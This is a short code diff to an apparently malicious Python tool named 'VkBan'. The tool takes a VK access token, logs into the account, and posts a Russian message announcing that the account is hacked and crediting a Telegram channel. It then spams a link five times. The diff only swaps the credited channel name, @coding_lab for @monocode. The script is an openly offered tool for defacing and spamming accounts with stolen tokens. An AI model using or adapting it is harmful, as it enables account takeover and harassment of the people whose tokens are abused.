@@ -23,7 +23,7 @@ VkBan
             tok = input("[ACCESS-TOKEN] -> ") 
             token = vk_api.VkApi(token = tok) 
             vk = token.get_api()
-            vk.wall.post(message='Твоя жопа взломана! Ответственность взял канал в телеграмме @coding_lab')
+            vk.wall.post(message='Твоя жопа взломана! Ответственность взял канал в телеграмме @monocode')
             for var in range(5):
                 time.sleep(3)
                 vk.wall.post(message='vto.pe')             
